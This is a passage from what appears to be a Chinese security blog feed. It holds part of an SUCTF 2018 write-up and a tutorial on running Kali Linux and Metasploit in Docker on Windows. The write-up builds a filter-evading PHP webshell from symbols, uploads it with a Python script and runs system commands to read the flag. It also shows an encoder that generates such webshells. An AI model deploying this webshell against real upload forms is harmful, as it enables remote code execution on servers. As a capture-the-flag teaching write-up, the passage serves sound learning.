title="Getshell"></a>Getshell</h2><p>要求上传的webshell文件从第6个字符开始都不能在黑名单内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"illegal char"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用burp intruder跑一遍，发现不在黑名单里的可打印字符有 <code>$()[]_~=;.</code>  共10个。</p><p>跑的时候需注意<code>Intruder=&gt;payloads=&gt;payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p><p>跑的时候可以在<code>Intruder=&gt;options=&gt;Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p><p>接下来就是构造一个由 <code>$()[]_~=;.</code> 组成的webshell了，主要思路来自 <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a> 。</p><p>构造出的最终结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);</span><br></pre></td></tr></table></figure><p>详细注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= </span><br><span class="line">$_=_==_;<span class="comment">//1</span></span><br><span class="line">$__=~一[$_];<span class="comment">//G</span></span><br><span class="line">$___=~了[$_];<span class="comment">//E</span></span><br><span class="line">$____=~端[$_];<span class="comment">//T</span></span><br><span class="line">$_____=~得[$_];<span class="comment">//A</span></span><br><span class="line">$______=~第[$_];<span class="comment">//S</span></span><br><span class="line">$_______=~学[$_];<span class="comment">//R</span></span><br><span class="line">$_=_.$__.$___.$____;<span class="comment">//_GET</span></span><br><span class="line">$_=$$_;<span class="comment">//$_GET</span></span><br><span class="line">$__=$_____.$______.$______.$___.$_______.$____;<span class="comment">//ASSERT</span></span><br><span class="line">$__($_[_]);<span class="comment">//ASSERT($_GET[_]);</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=phpinfo();</span><br></pre></td></tr></table></figure><p>可以有一个更短更舒服的选择</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);</span><br></pre></td></tr></table></figure><p>详细注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$_=_==_;<span class="comment">//1</span></span><br><span class="line">$__=~一[$_];<span class="comment">//G</span></span><br><span class="line">$___=~了[$_];<span class="comment">//E</span></span><br><span class="line">$____=~端[$_];<span class="comment">//T</span></span><br><span class="line">$_=_.$__.$___.$____;<span class="comment">//_GET</span></span><br><span class="line">$_=$$_;<span class="comment">//$_GET</span></span><br><span class="line">$_[_]($_[__]);<span class="comment">//$_GET[_]($_GET[__]);</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=assert&amp;__=phpinfo();</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system(%22ls%20-l%20/%22);</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=readfile(%27/Th1s_14_f14g%27);</span></span><br><span class="line"></span><br><span class="line">SUCTF&#123;KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o&#125;</span><br></pre></td></tr></table></figure><p>上传小脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">data=<span class="string">"&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);"</span></span><br><span class="line">base=<span class="string">"http://web.suctf.asuri.org:82/"</span></span><br><span class="line">files = &#123;<span class="string">'file'</span>: (<span class="string">'findneo.php'</span>, data, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">content = requests.post(base+<span class="string">"upload.php"</span>, files=files).text</span><br><span class="line">cmd=<span class="string">'system("dir /");'</span></span><br><span class="line">payload=base+re.match(<span class="string">"[\s\S]*Stored in: ([a-z.0-9/]+)[\s\S]*"</span>,content).group(<span class="number">1</span>)+<span class="string">"?_=assert&amp;__="</span>+cmd</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">print</span> requests.get(payload).content</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system("dir /");</span></span><br><span class="line"><span class="comment"># 1Th1s_14_f14g  boot  etc   lib mediaopt   root  sbin  sys  usr</span></span><br><span class="line"><span class="comment"># bin      dev   home  lib64  mntproc  run   srv   tmp  var</span></span><br></pre></td></tr></table></figure><p>写了一个用上述方法生成任意字母构成的字符串的小程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: 'findneo'</span></span><br><span class="line"><span class="comment"># compose php code from limited whitelist: $()[]_~=;.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gendict</span><span class="params">(index=<span class="string">'_==_'</span>,target_chars=[chr<span class="params">(i)</span> for i in range<span class="params">(<span class="number">0x20</span>,<span class="number">0x7f</span>)</span>])</span>:</span></span><br><span class="line">    sentence=<span class="string">"如是我闻。一时薄伽梵。住王舍城鹫峰山顶。与大苾刍众千二百五十人俱。皆阿罗汉。诸漏已尽无复烦恼得真自在心善解脱慧善解脱。如调慧马亦如大龙。已作所作已办所办。弃诸重担逮得己利。尽诸有结正知解脱。至心自在第一究竟。除阿难陀独居学地得预流果。大迦叶波而为上首。复有五百苾刍尼众。皆阿罗汉。大胜生主而为上首。复有无量邬波索迦、邬波斯迦。皆见圣谛。复有无量无数菩萨摩诃萨众。一切皆得陀罗尼门三摩地门。住空无相无分别愿。已得诸法平等性忍。具足成就四无碍解。凡所演说辩才无尽。于五神通自在游戏。所证智断永无退失。言行威肃闻皆敬受。勇猛精进离诸懈怠。能舍亲财不顾身命。离矫离诳无染无求。等为有情而宣正法。契深法忍穷最极趣。得无所畏其心泰然。超众魔境出诸业障。摧灭一切烦恼怨敌。建正法幢伏诸邪论。声闻独觉不能测量。得心自在得法自在。业惑见障皆已解脱。择法辩说无不善巧。入深缘起生灭法门。离见随眠舍诸缠结。智慧通达诸圣谛理。曾无数劫发弘誓愿。容貌熙怡先言接引。远离颦蹙辞韵清和。赞颂善巧辩才无滞。处无边众威德肃然。抑扬自在都无所畏。多俱胝劫巧说无尽。于诸法门胜解观察。如幻如阳焰。如梦如水月。如响如空花。如像如光影。如变化事。如寻香城。虽皆无实而现似有。离下劣心说法无畏。能随证入无量法门。善知有情心行所趣。以微妙慧而度脱之。于诸有情心无挂碍。成就最上无生法忍。善入诸法平等性智。甚深法性能如实知。随其所应巧令悟入。能善宣说缘起法门。摄受无边佛国大愿。于十方界无数诸佛。等持正念常现在前。诸佛出世皆能历事。亦能劝请转正法轮。不般涅槃度无量众善能伏灭一切有情种种见缠诸烦恼焰。须臾游戏百千等持。引发无边殊胜功德。此诸菩萨具如是等妙功德海。设经无量俱胝大劫。叹不能尽。其名曰贤守菩萨摩诃萨。宝性菩萨摩诃萨。宝藏菩萨摩诃萨。宝授菩萨摩诃萨。导师菩萨摩诃萨。仁授菩萨摩诃萨。星授菩萨摩诃萨。神授菩萨摩诃萨。帝授菩萨摩诃萨。广慧菩萨摩诃萨。胜慧菩萨摩诃萨。上慧菩萨摩诃萨。增长慧菩萨摩诃萨。无边慧菩萨摩诃萨。不虚见菩萨摩诃萨。无障慧菩萨摩诃萨。善发趣菩萨摩诃萨。善勇猛菩萨摩诃萨。极精进菩萨摩诃萨。常精进菩萨摩诃萨。常加行菩萨摩诃萨。不舍轭菩萨摩诃萨。日藏菩萨摩诃萨。月藏菩萨摩诃萨。无比慧菩萨摩诃萨。观自在菩萨摩诃萨。得大势菩萨摩诃萨。妙吉祥菩萨摩诃萨。宝印手菩萨摩诃萨。摧魔力菩萨摩诃萨。金刚慧菩萨摩诃萨。金刚藏菩萨摩诃萨。常举手菩萨摩诃萨。大悲心菩萨摩诃萨。大庄严菩萨摩诃萨。庄严王菩萨摩诃萨。山峰菩萨摩诃萨。宝峰菩萨摩诃萨。德王菩萨摩诃萨。慈氏菩萨摩诃萨。如是等无量百千俱胝那庾多菩萨摩诃萨。皆法王子堪绍佛位而为上首。尔时世尊于师子座上。自敷尼师坛结跏趺坐。端身正愿住对面念。入等持王妙三摩地。诸三摩地皆摄入此三摩地中。是所流故。尔时世尊正知正念。从等持王安庠而起。以净天眼观察十方殑伽沙等诸佛世界。举身怡悦。从两足下千辐轮相。各放六十百千俱胝那庾多光。从足十指。两趺两跟。四踝两胫。两腨两膝。两股。腰胁腹背。脐中心上胸臆德字。两乳两腋。两肩两髆。两肘两臂。两腕两手。两掌十指。项咽颐颔。颊额头顶两眉两眼。两耳两鼻。口四牙。四十齿。眉间毫相。一一身分。各放六十百千俱胝那庾多光。此一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊一切毛孔皆悉熙怡。各出六十百千俱胝那庾多光。是一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊演身常光照此三千大千世界。从此展转遍照十方殑伽沙等诸佛国土。其中有情遇斯光者。必得无上正等菩提。尔时世尊从其面门出广长舌相。遍覆三千大千世界。熙怡微笑。复从舌相流出无量百千俱胝那庾多光。其光杂色。从此杂色一一光中。现宝莲花。其花千叶皆真金色。众宝庄严。绮饰鲜荣。甚可爱乐。香气芬烈。周流普熏。细滑轻软。触生妙乐。诸花台中皆有化佛结跏趺坐。演妙法音。一一法音。皆说般若波罗蜜多相应之法。有情闻者必得无上正等菩提。从此展转。流遍十方殑伽沙等诸佛世界。说法利益亦复如是。"</span></span><br><span class="line">    parse_byte=<span class="keyword">lambda</span> c:[~i%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> bytes(c, encoding=<span class="string">'utf-8'</span>)][<span class="number">1</span>]</span><br><span class="line">    d=dict()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> sentence:</span><br><span class="line">        j=parse_byte(k)</span><br><span class="line">        <span class="keyword">if</span> chr(j) <span class="keyword">in</span> target_chars <span class="keyword">and</span> chr(j) <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">            d[chr(j)]=<span class="string">"~&#123;&#125;[&#123;&#125;]"</span>.format(k,index)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gencode</span><span class="params">(code)</span>:</span></span><br><span class="line">    d=gendict(index=<span class="string">'$_'</span>,target_chars=<span class="string">''</span>.join(set(code)))</span><br><span class="line">    res=<span class="string">'$__='</span>+<span class="string">'.'</span>.join(map(<span class="keyword">lambda</span> x:d[x],code))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=<span class="string">'@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~'</span></span><br><span class="line">print(gencode(code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;?php </span></span><br><span class="line"><span class="comment"># $_=_==_;</span></span><br><span class="line"><span class="comment"># $__=~俱[$_].~得[$_].~住[$_].~伽[$_].~结[$_].~二[$_].~鹫[$_].~一[$_].~已[$_].~足[$_].~流[$_].~索[$_].~峰[$_].~精[$_].~山[$_].~尽[$_].~诸[$_].~宣[$_].~正[$_].~第[$_].~竟[$_].~誓[$_].~马[$_].~言[$_].~解[$_].~如[$_].~神[$_].~大[$_].~声[$_].~梵[$_].~顶[$_].~堪[$_].~城[$_].~果[$_].~坛[$_].~真[$_].~相[$_].~皆[$_].~百[$_].~是[$_].~闻[$_].~薄[$_].~数[$_].~生[$_].~响[$_].~和[$_].~摩[$_].~萨[$_].~叶[$_].~王[$_].~千[$_].~猛[$_].~苾[$_].~办[$_].~所[$_].~我[$_].~自[$_].~熙[$_].~慧[$_].~脱[$_].~烦[$_].~邬[$_].~恼[$_];</span></span><br><span class="line"><span class="comment"># var_dump($__);</span></span><br><span class="line"><span class="comment"># // string(63) "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>把magic视为256x256的由0，1组成的矩阵M，把cipher视为256x1的矩阵C，把key视为256x1的矩阵K，已知M,C，且M*K = C (.mod 2)，求K。</p><p>可以采用<code>Gauss-Jordan 消元法</code> 将增广矩阵<code>[M|C]</code> 简化为行阶梯形矩阵，那么变化后的C就是我们的解K。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">read_to_int_array = <span class="keyword">lambda</span> x:[map(int,list(bin(int(line,<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> open(x).readlines()]</span><br><span class="line">cipher = read_to_int_array(<span class="string">'cipher.txt'</span>)[<span class="number">0</span>]</span><br><span class="line">magic = read_to_int_array(<span class="string">'magic.txt'</span>)</span><br><span class="line">dim=len(cipher)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> range(dim):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(col,dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span>:</span><br><span class="line">            magic[col],magic[row]=magic[row],magic[col]</span><br><span class="line">            cipher[col],cipher[row]=cipher[row],cipher[col]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span> <span class="keyword">and</span> row!=col:</span><br><span class="line">            <span class="keyword">for</span> each_in_row <span class="keyword">in</span> range(dim):</span><br><span class="line">                magic[row][each_in_row]^=magic[col][each_in_row]</span><br><span class="line">            cipher[row]^=cipher[col]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%hex(int(<span class="string">''</span>.join(map(str,cipher)),<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment">#flag&#123;Now_you_know_the_Hill_Cipher_xwg&#125;</span></span><br></pre></td></tr></table></figure><p>参考链接：</p><ul><li><a href="https://blog.csdn.net/u010182633/article/details/45225179" target="_blank" rel="noopener">https://blog.csdn.net/u010182633/article/details/45225179</a> </li><li><a href="https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP" target="_blank" rel="noopener">https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP</a> </li><li>也可尝试借助matlab的 <a href="https://ww2.mathworks.cn/help/matlab/ref/rref.html" target="_blank" rel="noopener">rref</a> 。</li></ul><h1 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h1><p><a href="https://github.com/findneo/ctfgodown/tree/master/20180527-suctf" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180527-suctf</a>    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;sandgame&quot;&gt;&lt;a href=&quot;#sandgame&quot; class=&quot;headerlink&quot; title=&quot;s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在win10家庭版上的Docker中使用Kali</title>
    <link href="https://findneo.github.io/180512KalionDocker/"/>
    <id>https://findneo.github.io/180512KalionDocker/</id>
    <published>2018-05-11T16:05:29.000Z</published>
    <updated>2019-01-25T23:21:37.008Z</updated>
    
    <content type="html"><![CDATA[<p><strong>全程需保证保证网络畅通</strong></p><h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><ul><li><p>从 <a href="https://docs.docker.com/toolbox/toolbox_install_windows/" target="_blank" rel="noopener">https://docs.docker.com/toolbox/toolbox_install_windows/</a> 下载DockerToolbox.exe 。关闭其他程序，右键管理员运行，选项可全部保持默认（如果电脑上未安装Git，在安装过程中需注意勾选）。</p></li><li><p>桌面可看到名为<code></code>Docker Quickstart Terminal`的快捷方式，右键管理员运行，<strong>等待直到</strong>出现<strong>可交互命令行</strong>。</p></li></ul><h2 id="修改默认存储位置到非系统盘"><a href="#修改默认存储位置到非系统盘" class="headerlink" title="修改默认存储位置到非系统盘"></a>修改默认存储位置到非系统盘</h2><ul><li><p>在上一步出现的<strong>可交互命令行界面</strong>运行 <code>docker-machine.exe stop default</code> 关闭基础虚拟机。</p></li><li><p>运行桌面上名为<code>Oracle VM VirtualBox</code> 的快捷方式。</p><ul><li>在<code>管理-&gt;虚拟介质管理器【CTRL+D】</code> 中复制<code>disk.vmdk</code> 到D盘 ，注意最好保持vmdk 格式。</li><li>选中<code>default</code> 虚拟机，右键<code>设置-&gt;存储-&gt;控制器：SATA-&gt;添加虚拟硬盘</code> 中添加D盘的<code>disk.vmdk</code> 。删除C盘的<code>disk.vmdk</code> 。保存设置。</li></ul></li><li><p>回到 命令行，运行<code>docker-machine.exe start default</code> 启动基础虚拟机。</p></li></ul><h1 id="下载Kali基础镜像并配置容器"><a href="#下载Kali基础镜像并配置容器" class="headerlink" title="下载Kali基础镜像并配置容器"></a>下载Kali基础镜像并配置容器</h1><ul><li><p>（<strong>以下命令均在上述命令行中输入</strong>）</p></li><li><p><code>docker pull  kalilinux/kali-linux-docker</code>  拉取Kali基础镜像，约700+M。</p></li><li><p><code>docker run -it --name kali kalilinux/kali-linux-docker /bin/bash</code> 基于该镜像启动一个容器并命名为<code>kali</code> 。</p></li><li><p><code>apt update &amp;&amp; apt full-upgrade &amp;&amp; apt auto-remove &amp;&amp; apt-autoclean</code> 安装工具前的准备工作。此处是<strong>一小段等待</strong>。</p></li><li><p><code>apt install kali-linux-all</code> 安装Kali的工具包。此处是<strong>漫长等待</strong>。 如果报错按错误提示操作即可。</p></li></ul><h2 id="配置msf数据库"><a href="#配置msf数据库" class="headerlink" title="配置msf数据库"></a>配置msf数据库</h2><ul><li><p><code>service postgresql start</code></p></li><li><p><code>su postgres</code></p></li><li><p><code>createuser username -P</code> 设置数据库用户账户密码</p></li><li><p><code>createdb --owner=username dbname &amp;&amp; exit</code>  创建数据库</p></li><li><p><code>cd /usr/share/metasploit-framework/config &amp;&amp; cp database.yml.example database.yml &amp;&amp; vi database.yml</code>  填好username,pass,dbname  。</p></li><li><p><code>msfconsole</code> </p><ul><li><code>db_status</code>  查看数据库连接状态</li><li><code>db_connect username:password@localhost/dbname</code>  //若没成功连接数据库，则手动连接</li></ul></li></ul><h1 id="常用基本操作"><a href="#常用基本操作" class="headerlink" title="常用基本操作"></a>常用基本操作</h1><h2 id="数据管理"><a href="#数据管理" class="headerlink" title="数据管理"></a>数据管理</h2><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><ul><li><code>docker cp  kali:/root/testfile testfile</code> </li><li><code>docker cp test kali:/root/test</code> </li></ul><h3 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h3><ul><li><code>docker volume create my-vol</code> </li><li><code>docker volume ls</code></li><li><code>docker run --mount source=my-vol,target=/webapp ...</code> </li><li>对应目录是default虚拟机的<code>/var/lib/docker/volumes/my-vol</code> ，并不能直接操作，理论上应该先在虚拟机和主机间共享文件夹，然后再使用数据卷。</li></ul><h3 id="挂载主机目录"><a href="#挂载主机目录" class="headerlink" title="挂载主机目录"></a>挂载主机目录</h3><ul><li><code>docker run --mount type=bind,source=/src/webapp,target=/opt/webapp ...</code>  </li></ul><h2 id="对镜像-image-的操作"><a href="#对镜像-image-的操作" class="headerlink" title="对镜像(image)的操作"></a>对镜像(image)的操作</h2><ul><li><p><code>docker search kali</code> 在线搜索镜像。</p></li><li><p><code>docker pull kalilinux/kali-linux-docker</code>  下载镜像。</p></li><li><p><code>docker image ls [-a]</code> 列出本地镜像。</p></li><li><p><code>docker image rm kalilinux/kali-linux-docker</code>   删除本地镜像。</p></li><li><p><code>docker commit -a findneo -m &quot;kali-all-tools installed;msfdb configured&quot; kali findneo/kali:v1</code> 生成镜像</p></li><li><p>保存与加载本地镜像</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">findneo/kali                  v1                  16b856910432        About an hour ago   13.2GB</span><br><span class="line">kalilinux/kali-linux-docker   latest              b8fe82f15421        2 months ago        749MB</span><br><span class="line"></span><br><span class="line">docker save -o D:\findneoandOriginKali.tar findneo/kali:v1 kalilinux/kali-linux-docker</span><br><span class="line">docker load -i D:\findneoandOriginKali.tar</span><br></pre></td></tr></table></figure></li></ul><h2 id="对容器-container-的操作"><a href="#对容器-container-的操作" class="headerlink" title="对容器(container)的操作"></a>对容器(container)的操作</h2><ul><li><code>docker run --rm kalilinux/kali-linux-docker /bin/echo &quot;hi&quot;</code><br>以<code>kalilinux/kali-linux-docker</code> 镜像为基础启动一个新的容器，执行命令<code>/bin/echo &quot;hi&quot;</code> ，退出、终止并删除容器。</li><li><p><code>docker run -it --name kali kalilinux/kali-linux-docker /bin/bash</code><br>以<code>kalilinux/kali-linux-docker</code> 镜像为基础启动一个新的容器，命名为<code>kali</code> ，提供bash终端 。执行<code>exit</code> 将退出、终止但保留容器。</p></li><li><p><code>docker start kali</code>   启动名为<code>kali</code> 的容器并在后台运行，<strong>相当于开机</strong> 。<br><code>docker exec -it kali bash</code>   进入<code>kali</code> 的bash终端。执行<code>exit</code> 将退出但不终止容器。<br><code>docker stop kali</code>    终止名为<code>kali</code> 的容器，<strong>相当于关机</strong> 。</p></li><li><p><code>docker container ls -a</code> 列出所有容器，不带<code>-a</code> 参数仅列出当前运行中的容器。<br><code>docker container rm kali</code> 删除指定容器。若容器正在运行需加<code>--force</code> 参数。</p></li><li><p><code>docker container export -o D:\mykaliv1.tar kali</code> 导出容器，<strong>相当于拍摄快照</strong> 。<br><code>docker import D:\mykaliv1.tar- test/kali:v1</code>  导入容器，<strong>相当于还原快照</strong> 。</p></li></ul><h1 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h1><ul><li>参考：<a href="https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file" target="_blank" rel="noopener">https://stackoverflow.com/questions/11659005/how-to-resize-a-virtualbox-vmdk-file</a> </li></ul><h2 id="扩容磁盘"><a href="#扩容磁盘" class="headerlink" title="扩容磁盘"></a>扩容磁盘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">关闭容器和default虚拟机</span><br><span class="line">docker stop kali</span><br><span class="line">docker-machine srop</span><br><span class="line">扩容磁盘</span><br><span class="line"><span class="built_in">cd</span> C:\Program Files\Oracle\VirtualBox</span><br><span class="line">VBoxManage clonehd <span class="string">"D:\vmac\dockerMachine\disk.vmdk"</span> <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> --format vdi</span><br><span class="line">VBoxManage modifyhd <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> --resize 204800</span><br><span class="line">VBoxManage clonehd <span class="string">"D:\vmac\dockerMachine\cloned.vdi"</span> <span class="string">"D:\vmac\dockerMachine\resized.vmdk"</span> --format vmdk</span><br></pre></td></tr></table></figure><h2 id="调整分区"><a href="#调整分区" class="headerlink" title="调整分区"></a>调整分区</h2><ul><li>从 <a href="https://gparted.sourceforge.io/download.php" target="_blank" rel="noopener">https://gparted.sourceforge.io/download.php</a> 下载gparted-live-0.31.0-1-amd64.iso。</li><li>在default虚拟机设置面板的<code>存储-&gt;控制器-&gt;添加虚拟光驱</code> 中将gparted-live-0.31.0-1-amd64.iso 加到SATA0端口，使其开机第一个启动。移除原有磁盘，将扩容后的磁盘放在原来磁盘的位置。</li><li><code>启动-&gt;无界面启动</code>  ，使用GParted 调整磁盘空间。Apply。双击桌面<code>EXIT</code> ，选择shutdown退出，按右CTRL键使焦点回到主机<br><img src="1526135602464.png" alt="1526135602464"></li><li>恢复虚拟机存储设置至下入状态<br><img src="1526142367100.png" alt="1526142367100"></li></ul><h2 id="查看调整分区是否成功"><a href="#查看调整分区是否成功" class="headerlink" title="查看调整分区是否成功"></a>查看调整分区是否成功</h2><ul><li><p><code>docker-machine start default</code> </p></li><li><p><code>docker-machine ssh default</code> 进入default虚拟机的shell，去看看分区扩容是否成功</p></li><li><p>查看并记录当前状态</p><ul><li><code>fdisk -l</code></li><li><code>df -h</code></li><li><code>cat /etc/fstab</code>   (/boot/grub/menu.lst文件没找到)</li></ul></li><li><p>对比前后状态可以看到已经成功了<br><img src="1526100195018.png" alt="1526100195018"><br><img src="1526137337445.png" alt="1526137337445"></p></li></ul><h2 id="Partition-table-entries-are-not-in-disk-order"><a 